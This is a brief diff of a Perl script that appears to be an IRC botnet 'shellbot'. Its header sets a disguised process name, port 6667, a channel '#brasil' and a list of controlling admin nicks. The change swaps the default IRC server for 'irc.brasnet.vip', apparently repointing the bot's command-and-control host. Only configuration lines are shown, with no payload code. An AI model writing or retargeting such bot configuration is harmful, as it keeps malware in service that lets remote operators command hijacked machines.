@@ -1,6 +1,6 @@
 #!/usr/bin/perl
 my $processo = '-lol';
-$servidor='irc.servercentral.net' unless $servidor;
+$servidor='irc.brasnet.vip' unless $servidor;
 my $porta='6667';
 my @canais=("#brasil");
 my @adms=("del","spy","lol","cypher","cypher-");
